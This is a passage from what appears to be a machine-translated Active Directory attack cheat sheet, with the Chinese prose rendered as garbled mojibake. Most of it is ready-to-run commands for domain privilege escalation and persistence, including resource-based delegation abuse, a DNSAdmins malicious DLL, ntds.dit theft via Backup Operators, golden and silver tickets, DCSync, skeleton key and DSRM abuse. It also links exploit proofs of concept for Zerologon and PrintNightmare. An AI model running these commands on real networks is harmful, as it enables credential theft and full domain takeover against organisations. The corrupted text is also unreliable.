.\PowerView.ps1<br/>$ComputerSid = Get-DomainComputer &lt;MachineAccountName&gt; -Properties objectsid | Select -Expand objectsid</span><span id="ddab" class="nl kw iq my b gy nq nn l no np">#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:<br/>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"<br/>$SDBytes = New-Object byte[] ($SD.BinaryLength) <br/>$SD.GetBinaryForm($SDBytes, 0)</span><span id="6741" class="nl kw iq my b gy nq nn l no np">#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView<br/>Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose</span><span id="d194" class="nl kw iq my b gy nq nn l no np">#After that we need to get the RC4 hash of the new machine account's password using Rubeus<br/>Rubeus.exe hash /password:'p@ssword!'</span><span id="f4af" class="nl kw iq my b gy nq nn l no np">#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus<br/>Rubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt</span><span id="889f" class="nl kw iq my b gy nq nn l no np">#Finally we can access the C$ drive of the target machine<br/>dir \\TargetMachine.wtver.domain\C$</span></pre><p id="4a1f" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">è¯¦ç»†æ–‡ç« :</p><ul class=""><li id="0f00" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" rel="noopener ugc nofollow" target="_blank">é¡¾å…¨å¤§å±€:æ»¥ç”¨åŸºäºèµ„æºçš„çº¦æŸå§”æ‰˜æ”»å‡»æ´»åŠ¨ç›®å½•</a></li><li id="3d06" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" rel="noopener ugc nofollow" target="_blank">åŸºäºèµ„æºçš„å—é™å§”æ‰˜æ»¥ç”¨</a></li></ul><p id="6272" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">çº¦æŸå’ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ‰˜ä¸­çš„â—å¦‚æœæˆ‘ä»¬æ²¡æœ‰è¯•å›¾æ»¥ç”¨çš„TRUSTED_TO_AUTH_FOR_DELEGATIONå¸æˆ·çš„å¯†ç /å“ˆå¸Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨kekeoçš„â€œtgt::delegâ€æˆ–rubeusçš„â€œtgtdelegâ€è¿™ä¸€éå¸¸å¥½çš„æŠ€å·§ï¼Œéª—è¿‡Kerberosç»™æˆ‘ä»¬ä¸€ä¸ªè¯¥å¸æˆ·çš„æœ‰æ•ˆtgtã€‚ç„¶åï¼Œæˆ‘ä»¬åªéœ€ä½¿ç”¨ç¥¨è¯è€Œä¸æ˜¯å¸æˆ·çš„å“ˆå¸Œæ¥æ‰§è¡Œæ”»å‡»ã€‚</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="b0e3" class="nl kw iq my b gy nm nn l no np">#Command on Rubeus<br/>Rubeus.exe tgtdeleg /nowrap</span></pre><p id="b718" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">è¯¦ç»†æ–‡ç« :<a class="ae mj" href="https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/" rel="noopener ugc nofollow" target="_blank">rube usâ€”â€”ç°åœ¨æœ‰æ›´å¤šKekeo </a></p><h1 id="c42c" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ»¥ç”¨DNSAdmins</h1><p id="4093" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">WUTæ˜¯è¿ªæ–¯ï¼Ÿ:å¦‚æœç”¨æˆ·æ˜¯DNSAdminsç»„çš„æˆå‘˜ï¼Œä»–å¯èƒ½ä¼šä»¥dns.exeçš„æƒé™åŠ è½½ä»»æ„DLLï¼Œä½œä¸ºSYSTEMè¿è¡Œã€‚å¦‚æœDCä¸ºDNSæä¾›æœåŠ¡ï¼Œç”¨æˆ·å¯ä»¥å°†å…¶æƒé™æå‡è‡³DAã€‚è¯¥æ”»å‡»è¿‡ç¨‹éœ€è¦é‡æ–°å¯åŠ¨DNSæœåŠ¡çš„æƒé™æ‰èƒ½è¿è¡Œã€‚</p><ol class=""><li id="32f9" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">æšä¸¾DNSAdminsç»„çš„æˆå‘˜:</li></ol><ul class=""><li id="81f4" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">PowerView: <code class="fe mv mw mx my b">Get-NetGroupMember -GroupName "DNSAdmins"</code></li><li id="836d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">å¹¿å‘Šæ¨¡å—:<code class="fe mv mw mx my b">Get-ADGroupMember -Identiny DNSAdmins</code></li></ul><ol class=""><li id="4bd2" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">ä¸€æ—¦æˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªç¾¤ä½“ä¸­çš„ä¸€å‘˜ï¼Œæˆ‘ä»¬å°±éœ€è¦å¦¥å(æœ‰å¾ˆå¤šæ–¹æ³•)ã€‚</li><li id="85e4" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">ç„¶åï¼Œé€šè¿‡åœ¨SMBå…±äº«ä¸Šæä¾›æ¶æ„dllå¹¶é…ç½®DLLä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æå‡æˆ‘ä»¬çš„æƒé™:</li></ol><ul class=""><li id="717d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">#Using dnscmd: dnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll #Restart the DNS Service: sc \\DNSServer stop dns sc \\DNSServer start dns</code></li></ul><h1 id="eb68" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ»¥ç”¨æ´»åŠ¨ç›®å½•é›†æˆçš„DNS</h1><ul class=""><li id="c7f0" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.netspi.com/exploiting-adidns/" rel="noopener ugc nofollow" target="_blank">åˆ©ç”¨é›†æˆæ´»åŠ¨ç›®å½•çš„DNS </a></li><li id="5ef5" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.netspi.com/adidns-revisited/" rel="noopener ugc nofollow" target="_blank">å†æ¬¡è®¿é—®ADI DNS</a></li><li id="c865" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/Kevin-Robertson/Inveigh" rel="noopener ugc nofollow" target="_blank">æ¼«éª‚</a></li></ul><h1 id="b4c6" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ»¥ç”¨å¤‡ä»½æ“ä½œå‘˜ç»„</h1><p id="2724" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:å¦‚æœæˆ‘ä»¬è®¾æ³•ä¾µå…¥å±äºBackup Operatorsç»„æˆå‘˜çš„ç”¨æˆ·å¸æˆ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ»¥ç”¨å…¶æƒé™æ¥åˆ›å»ºDCå½“å‰çŠ¶æ€çš„å·å½±å‰¯æœ¬ï¼Œæå–ntds.ditæ•°æ®åº“æ–‡ä»¶ï¼Œè½¬å‚¨å“ˆå¸Œå¹¶å°†æˆ‘ä»¬çš„æƒé™å‡çº§åˆ°DAã€‚</em></p><ol class=""><li id="ecdf" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">ä¸€æ—¦æˆ‘ä»¬è·å¾—äº†æ‹¥æœ‰SeBackupPrivilegeçš„å¸æˆ·çš„è®¿é—®æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¿é—®DCå¹¶ä½¿ç”¨ç­¾åçš„äºŒè¿›åˆ¶ç£ç›˜åˆ›å»ºå·å½±å‰¯æœ¬å·å½±:</li></ol><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="3a81" class="nl kw iq my b gy nm nn l no np">#Create a .txt file that will contain the shadow copy process script<br/>Script -&gt;{<br/>set context persistent nowriters  <br/>set metadata c:\windows\system32\spool\drivers\color\example.cab  <br/>set verbose on  <br/>begin backup  <br/>add volume c: alias mydrive  <br/> <br/>create  <br/>  <br/>expose %mydrive% w:  <br/>end backup  <br/>}</span><span id="6909" class="nl kw iq my b gy nq nn l no np">#Execute diskshadow with our script as parameter<br/>diskshadow /s script.txt</span></pre><ol class=""><li id="d2ef" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦è®¿é—®å·å½±å‰¯æœ¬ï¼Œæˆ‘ä»¬å¯èƒ½æœ‰SeBackupPrivilegeï¼Œä½†æˆ‘ä»¬ä¸èƒ½ç®€å•åœ°å¤åˆ¶ç²˜è´´ntds.ditï¼Œæˆ‘ä»¬éœ€è¦æ¨¡æ‹Ÿå¤‡ä»½è½¯ä»¶ï¼Œå¹¶ä½¿ç”¨Win32 APIè°ƒç”¨å°†å…¶å¤åˆ¶åˆ°å¯è®¿é—®çš„æ–‡ä»¶å¤¹ä¸­ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨<a class="ae mj" href="https://github.com/giuliano108/SeBackupPrivilege" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æƒŠäººçš„å›è´­:</li></ol><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="48dc" class="nl kw iq my b gy nm nn l no np">#Importing both dlls from the repo using powershell<br/>Import-Module .\SeBackupPrivilegeCmdLets.dll<br/>Import-Module .\SeBackupPrivilegeUtils.dll<br/>  <br/>#Checking if the SeBackupPrivilege is enabled<br/>Get-SeBackupPrivilege<br/>  <br/>#If it isn't we enable it<br/>Set-SeBackupPrivilege<br/>  <br/>#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice<br/>Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\&lt;PathToSave&gt;\ntds.dit -Overwrite<br/>  <br/>#Dump the SYSTEM hive<br/>reg save HKLM\SYSTEM c:\temp\system.hive</span></pre><ol class=""><li id="173d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">ä½¿ç”¨impacketæˆ–å…¶ä»–å·¥å…·ä¸­çš„smbclient.pyï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°æœºå™¨ä¸Šå¤åˆ¶ntds.ditå’ŒSYSTEM hiveã€‚</li><li id="cb82" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">ä½¿ç”¨impacketä¸­çš„secretsdump.pyå¹¶è½¬å‚¨å“ˆå¸Œã€‚</li><li id="a21d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">ä½¿ç”¨psexecæˆ–æ‚¨é€‰æ‹©çš„å…¶ä»–å·¥å…·æ¥PTHå¹¶è·å¾—åŸŸç®¡ç†å‘˜è®¿é—®æƒé™ã€‚</li></ol><h1 id="2df2" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ»¥ç”¨äº¤æ¢</h1><ul class=""><li id="cb41" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" rel="noopener ugc nofollow" target="_blank">æ»¥ç”¨æ¥è‡ªDAçš„Exchange one Apiè°ƒç”¨</a></li><li id="f782" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys" rel="noopener ugc nofollow" target="_blank">CVE-2020â€“0688</a></li><li id="d17c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/dirkjanm/PrivExchange" rel="noopener ugc nofollow" target="_blank"> PrivExchange </a>æ»¥ç”¨Exchangeï¼Œç”¨ä½ çš„æƒé™æ¢å–åŸŸç®¡ç†å‘˜æƒé™</li></ul><h1 id="1d25" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ­¦å™¨åŒ–æ‰“å°æœºBug</h1><ul class=""><li id="f4ed" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/" rel="noopener ugc nofollow" target="_blank">æ‰“å°æœºæœåŠ¡å™¨å¯¹åŸŸç®¡ç†å‘˜çš„Bug</a></li><li id="8fa1" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/NotMedic/NetNTLMtoSilverTicket" rel="noopener ugc nofollow" target="_blank"> NetNTLMtoSilverTicket </a></li></ul><h1 id="8e75" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ»¥ç”¨ACL</h1><ul class=""><li id="8d94" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" rel="noopener ugc nofollow" target="_blank">ä½¿ç”¨Active Directoryä¸­çš„ACLæå‡æƒé™</a></li><li id="33b9" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/fox-it/aclpwn.py" rel="noopener ugc nofollow" target="_blank"> aclpwn.py </a></li><li id="389a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/fox-it/Invoke-ACLPwn" rel="noopener ugc nofollow" target="_blank">è°ƒç”¨-ACLPwn </a></li></ul><h1 id="34fd" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä½¿ç”¨mitm6æ»¥ç”¨IPv6</h1><ul class=""><li id="f62b" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" rel="noopener ugc nofollow" target="_blank">é€šè¿‡IPv6å±åŠIPv4ç½‘ç»œ</a></li><li id="6902" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">mitm6 </li></ul><h1 id="0768" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">SIDå†å²æ»¥ç”¨</h1><p id="b54f" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">WUTæ˜¯è¿ªæ–¯ï¼Ÿ:å¦‚æœæˆ‘ä»¬è®¾æ³•ç ´åäº†æ£®æ—çš„å­åŸŸï¼Œå¹¶ä¸”æ²¡æœ‰å¯ç”¨ <a class="ae mj" href="https://www.itprotoday.com/windows-8/sid-filtering" rel="noopener ugc nofollow" target="_blank"> <em class="of"> SIDè¿‡æ»¤</em> </a> <em class="of">(å¤§å¤šæ•°æƒ…å†µä¸‹æ²¡æœ‰å¯ç”¨)ï¼Œæˆ‘ä»¬å¯ä»¥æ»¥ç”¨å®ƒçš„æƒé™ï¼Œå°†å…¶å‡çº§ä¸ºæ£®æ—çš„æ ¹åŸŸçš„åŸŸç®¡ç†å‘˜ã€‚è¿™æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºkerberos TGTç¥¨æ®ä¸Šçš„</em> <a class="ae mj" href="https://www.itprotoday.com/windows-8/sid-history" rel="noopener ugc nofollow" target="_blank"> <em class="of"> SIDå†å²</em> </a> <em class="of">å­—æ®µå®šä¹‰äº†â€œé¢å¤–çš„â€å®‰å…¨ç»„å’Œç‰¹æƒã€‚</em></p><p id="b4bc" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">åˆ©ç”¨ç¤ºä¾‹:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="b1f5" class="nl kw iq my b gy nm nn l no np">#Get the SID of the Current Domain using PowerView<br/>Get-DomainSID -Domain current.root.domain.local</span><span id="641c" class="nl kw iq my b gy nq nn l no np">#Get the SID of the Root Domain using PowerView<br/>Get-DomainSID -Domain root.domain.local</span><span id="b6ef" class="nl kw iq my b gy nq nn l no np">#Create the Enteprise Admins SID<br/>Format: RootDomainSID-519</span><span id="a6a4" class="nl kw iq my b gy nq nn l no np">#Forge "Extra" Golden Ticket using mimikatz<br/>kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi</span><span id="c203" class="nl kw iq my b gy nq nn l no np">#Inject the ticket into memory<br/>kerberos::ptt \path\to\ticket\golden.kirbi</span><span id="b16e" class="nl kw iq my b gy nq nn l no np">#List the DC of the Root Domain<br/>dir \\dc.root.domain.local\C$</span><span id="1ec0" class="nl kw iq my b gy nq nn l no np">#Or DCsync and dump the hashes using mimikatz<br/>lsadump::dcsync /domain:root.domain.local /all</span></pre><p id="222e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">è¯¦ç»†æ–‡ç« :</p><ul class=""><li id="8d56" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://adsecurity.org/?p=1640" rel="noopener ugc nofollow" target="_blank"> Kerberosé‡‘åˆ¸ç°åœ¨æ›´åŠ é‡‘è‰²äº†</a></li><li id="597e" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" rel="noopener ugc nofollow" target="_blank">æ”»å‡»åŸŸä¿¡ä»»çš„æŒ‡å—</a></li></ul><h1 id="53c5" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">åˆ©ç”¨SharePoint</h1><ul class=""><li id="1cf8" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d" rel="noopener">CVE-2019â€“0604</a>RCEå¼€é‡‡<br/>T21ã€PoCã€‘</li><li id="71aa" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization" rel="noopener ugc nofollow" target="_blank">CVE-2019â€“1257</a>é€šè¿‡BDCååºåˆ—åŒ–æ‰§è¡Œä»£ç </li><li id="dbe5" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters" rel="noopener ugc nofollow" target="_blank">CVE-2020â€“0932</a>RCEä½¿ç”¨ç±»å‹è½¬æ¢å™¨<br/> <a class="ae mj" href="https://github.com/thezdi/PoC/tree/master/CVE-2020-0932" rel="noopener ugc nofollow" target="_blank">æ¦‚å¿µéªŒè¯</a></li></ul><h1 id="5223" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">Zerologon</h1><ul class=""><li id="b67c" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://www.secura.com/whitepapers/zerologon-whitepaper" rel="noopener ugc nofollow" target="_blank"> Zerologon:æœªç»è®¤è¯çš„åŸŸæ§åˆ¶å™¨å±å®³</a>:æ¼æ´ç™½çš®ä¹¦ã€‚</li><li id="6f0a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon" rel="noopener ugc nofollow" target="_blank">sharp zero logon</a>:zero logonæ¼æ´åˆ©ç”¨çš„C#å®ç°ã€‚</li><li id="68c5" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/BC-SECURITY/Invoke-ZeroLogon" rel="noopener ugc nofollow" target="_blank">Invoke-zero logon</a>:zero logonæ¼æ´åˆ©ç”¨çš„Powershellå®ç°ã€‚</li><li id="a2a0" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">ä½¿ç”¨impacketåº“çš„Zerologonæ¼æ´åˆ©ç”¨çš„Pythonå®ç°ã€‚</li></ul><h1 id="2063" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">å°åˆ·å™©æ¢¦</h1><ul class=""><li id="2bdc" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527" rel="noopener ugc nofollow" target="_blank">CVE-2021â€“34527</a>:æ¼æ´è¯¦æƒ…ã€‚</li><li id="e38c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/cube0x0/CVE-2021-1675" rel="noopener ugc nofollow" target="_blank">PrintNightmareçš„impacketå®ç°</a>:ä½¿ç”¨Impacketåº“çš„print nightmareçš„å¯é PoCã€‚</li><li id="7700" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare" rel="noopener ugc nofollow" target="_blank">CVE-2021â€“1675</a>çš„C#å®ç°:ç”¨C#å†™çš„PrintNightmareçš„å¯é PoCã€‚</li></ul><h1 id="5cbc" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">é¢†åŸŸæŒä¹…æ€§</h1><h1 id="a14b" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">é‡‘ç¥¨æ”»å‡»</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="73c4" class="nl kw iq my b gy nm nn l no np">#Execute mimikatz on DC as DA to grab krbtgt hash:<br/>Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName &lt;DC'sName&gt;</span><span id="bbcb" class="nl kw iq my b gy nq nn l no np">#On any machine:<br/>Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain's SID&gt; /krbtgt:<br/>&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span></pre><h1 id="b06c" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">DCsyncæ”»å‡»</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1ec5" class="nl kw iq my b gy nm nn l no np">#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):<br/>Invoke-Mimikatz -Command '"lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;"'</span><span id="954e" class="nl kw iq my b gy nq nn l no np">#DCsync using secretsdump.py from impacket with NTLM authentication<br/>secretsdump.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;DC'S IP or FQDN&gt; -just-dc-ntlm</span><span id="822a" class="nl kw iq my b gy nq nn l no np">#DCsync using secretsdump.py from impacket with Kerberos Authentication<br/>secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC'S IP or FQDN&gt; -just-dc-ntlm</span></pre><p id="dd71" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æç¤º:<br/> /ptt - &gt;åœ¨å½“å‰è¿è¡Œçš„ä¼šè¯ä¸­æ³¨å…¥ç¥¨è¯<br/> /ticket - &gt;å°†ç¥¨è¯ä¿å­˜åœ¨ç³»ç»Ÿä¸­ä»¥å¤‡åç”¨</p><h1 id="9546" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">é“¶ç¥¨æ”»å‡»</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="4958" class="nl kw iq my b gy nm nn l no np">Invoke-Mimikatz -Command '"kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:<br/>&lt;ServiceType&gt; /rc4:&lt;TheSPN's Account NTLM Hash&gt; /user:&lt;UserToImpersonate&gt; /ptt"'</span></pre><p id="3efe" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><a class="ae mj" href="https://adsecurity.org/?page_id=183" rel="noopener ugc nofollow" target="_blank"> SPNåˆ—è¡¨</a></p><h1 id="b374" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä¸‡èƒ½é’¥åŒ™æ”»å‡»</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1103" class="nl kw iq my b gy nm nn l no np">#Exploitation Command runned as DA:<br/>Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName &lt;DC's FQDN&gt;</span><span id="3899" class="nl kw iq my b gy nq nn l no np">#Access using the password "mimikatz"<br/>Enter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\Administrator</span></pre><h1 id="0880" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">DSRMæ»¥ç”¨</h1><p id="01b5" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:æ¯ä¸ªDCéƒ½æœ‰ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜å¸æˆ·ï¼Œè¯¥å¸æˆ·å…·æœ‰DSRMå¯†ç ï¼Œå³SafeBackupPasswordã€‚æˆ‘ä»¬å¯ä»¥å¾—åˆ°å®ƒï¼Œç„¶åpthå®ƒçš„NTLMæ•£åˆ—æ¥è®©æœ¬åœ°ç®¡ç†å‘˜è®¿é—®DCï¼</em></p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="3999" class="nl kw iq my b gy nm nn l no np">#Dump DSRM password (needs DA privs):<br/>Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName &lt;DC's Name&gt;</span><span id="f5a4" class="nl kw iq my b gy nq nn l no np">#This is a local account, so we can PTH and authenticate!<br/>#BUT we need to alter the behaviour of the DSRM account before pth:<br/>#Connect on DC:<br/>Enter-PSSession -ComputerName &lt;DC's Name&gt;</span><span id="6ce6" class="nl kw iq my b gy nq nn l no np">#Alter the Logon behaviour on registry:<br/>New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose</span><span id="5a87" class="nl kw iq my b gy nq nn l no np">#If the property already exists:<br/>Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose</span></pre><p id="6d54" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls 